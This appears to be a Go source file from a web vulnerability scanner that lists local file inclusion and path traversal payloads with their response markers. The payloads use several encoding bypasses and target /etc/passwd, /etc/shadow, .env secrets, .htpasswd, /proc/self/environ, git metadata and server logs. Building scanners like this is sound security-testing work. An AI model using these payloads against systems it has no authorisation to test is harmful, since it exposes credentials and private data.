package lfi_path_traversal

// lfiPayload represents a path traversal payload with its expected file markers.
type lfiPayload struct {
	payload string
	markers []string // strings expected in the response if the file is read
}

// tier1Payloads are always tested. Each targets a well-known OS file.
var tier1Payloads = []lfiPayload{
	// Linux /etc/passwd — multiple traversal depths
	{payload: "../../../../etc/passwd", markers: []string{"root:", ":0:0:", "/bin/"}},
	{payload: "../../../../../../etc/passwd", markers: []string{"root:", ":0:0:", "/bin/"}},
	{payload: "../../../../../../../../../../../../etc/passwd", markers: []string{"root:", ":0:0:", "/bin/"}},

	// Null byte injection (bypass extension append)
	{payload: "../../../../etc/passwd%00", markers: []string{"root:", ":0:0:", "/bin/"}},
	{payload: "../../../../etc/passwd%00.jpg", markers: []string{"root:", ":0:0:", "/bin/"}},
	{payload: "../../../../etc/passwd%00.html", markers: []string{"root:", ":0:0:", "/bin/"}},

	// Double URL encoding
	{payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", markers: []string{"root:", ":0:0:", "/bin/"}},

	// Unicode encoding bypass
	{payload: "%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd", markers: []string{"root:", ":0:0:", "/bin/"}},

	// Overlong UTF-8 encoding
	{payload: "%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd", markers: []string{"root:", ":0:0:", "/bin/"}},

	// Backslash variants (Windows IIS)
	{payload: `..\..\..\..\etc\passwd`, markers: []string{"root:", ":0:0:", "/bin/"}},

	// Dot-dot-slash with filter bypass
	{payload: "....//....//....//....//etc/passwd", markers: []string{"root:", ":0:0:", "/bin/"}},
	{payload: "./.././.././.././.././../etc/passwd", markers: []string{"root:", ":0:0:", "/bin/"}},

	// Windows win.ini
	{payload: "../../../../windows/win.ini", markers: []string{"bit app support", "fonts", "extensions"}},
	{payload: `..\..\..\..\windows\win.ini`, markers: []string{"bit app support", "fonts", "extensions"}},
	{payload: "../../../../windows/win.ini%00", markers: []string{"bit app support", "fonts", "extensions"}},
}

// tier2CanaryFiles are tested only if tier 1 caused a status code change (suggests traversal works but file differs).
var tier2CanaryFiles = []lfiPayload{
	// Linux shadow (requires root)
	{payload: "../../../../etc/shadow", markers: []string{"root:", "$6$", "$y$"}},
	// Linux hosts
	{payload: "../../../../etc/hosts", markers: []string{"127.0.0.1", "localhost"}},
	// Linux hostname
	{payload: "../../../../etc/hostname", markers: []string{}}, // any non-empty short body
	// Linux /proc/self/environ
	{payload: "../../../../proc/self/environ", markers: []string{"PATH=", "HOME="}},
	// Linux /proc/version
	{payload: "../../../../proc/version", markers: []string{"Linux version"}},
	// Windows boot.ini
	{payload: `..\..\..\..\boot.ini`, markers: []string{"boot loader", "operating systems"}},
	// Web config files
	{payload: "../../../../etc/apache2/apache2.conf", markers: []string{"ServerRoot", "DocumentRoot"}},
	{payload: "../../../../etc/nginx/nginx.conf", markers: []string{"server", "location"}},
	// Java web.xml
	{payload: "../../WEB-INF/web.xml", markers: []string{"<web-app", "</web-app>"}},
	// Git directory
	{payload: "../../../../.git/HEAD", markers: []string{"ref: refs/", "ref:refs/"}},
	// Application config files
	{payload: "../../../../.env", markers: []string{"DB_PASSWORD", "APP_KEY", "APP_SECRET"}},
	// htpasswd
	{payload: "../../../../.htpasswd", markers: []string{"$apr1$", "$2y$", "{SHA}"}},
	// Log files
	{payload: "../../../../var/log/apache2/access.log", markers: []string{"GET ", "HTTP/1."}},
	{payload: "../../../../var/log/nginx/access.log", markers: []string{"GET ", "HTTP/1."}},
}
